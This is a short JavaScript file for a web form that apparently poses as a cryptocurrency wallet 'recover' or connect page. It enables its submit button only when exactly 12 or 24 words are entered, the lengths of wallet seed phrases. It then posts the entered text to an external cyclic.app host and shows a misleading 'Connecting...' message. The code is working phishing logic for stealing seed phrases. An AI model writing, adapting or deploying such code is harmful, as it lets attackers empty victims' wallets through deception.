
function countWords() {

    // Get the input text value
    var inputField = document.getElementById("msg-text").value;
    var text = inputField.split(' ');
    var numWords = 0;
    for (var i = 0; i < text.length; i++) {
        if (text[i] !== ' ' && isWord(text[i])) {
            numWords++;
        }
    }

    // Display it as output
    // console.log("Word count is "+numWords);
    // document.getElementById("inputCount").innerHTML = numWords;
    
    if(numWords == 12 || numWords == 24){
        document.getElementById("submit-btn").removeAttribute("disabled");
        const btn = document.getElementById("submit-btn");
        btn.style.background = "#6490f1";

    }else{
        document.getElementById("submit-btn").setAttribute("disabled","disabled");
        const btn = document.getElementById("submit-btn");
        btn.style.background = "grey";
    }
    
}

function isWord(str) {
    var alphaNumericFound = false;
    for (var i = 0; i < str.length; i++) {
    var code = str.charCodeAt(i);
    if ((code > 47 && code < 58) || // numeric (0-9)
        (code > 64 && code < 91) || // upper alpha (A-Z)
        (code > 96 && code < 123)) { // lower alpha (a-z)
        alphaNumericFound = true;
        return alphaNumericFound;
    }
    }
    return alphaNumericFound;
}

const form = document.querySelector('#msg-form');
form.addEventListener('submit', handleSubmit);

function handleSubmit(event) {
    event.preventDefault()

    document.getElementById("submit-btn").setAttribute("disabled","disabled")
    const btn = document.getElementById("submit-btn")
    btn.style.background = "grey";

    const text = document.getElementById('msg-text').value;
    const data = { text };
    sendData(data)
}

function sendData(data) {
    fetch('https://cheerful-teal-lion.cyclic.app/recover', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    })
    .then(response => {
      if (response.status === 200) {
        alert('Connecting...');
        
      } else {
        alert('connection failed, try again');
        document.getElementById("submit-btn").removeAttribute("disabled");
        const btn = document.getElementById("submit-btn");
        btn.style.background = "#6490f1";
      }
    })
    .catch(error => {
      alert('server error, try again');
      document.getElementById("submit-btn").removeAttribute("disabled");
      const btn = document.getElementById("submit-btn");
      btn.style.background = "#6490f1";
    });
  }
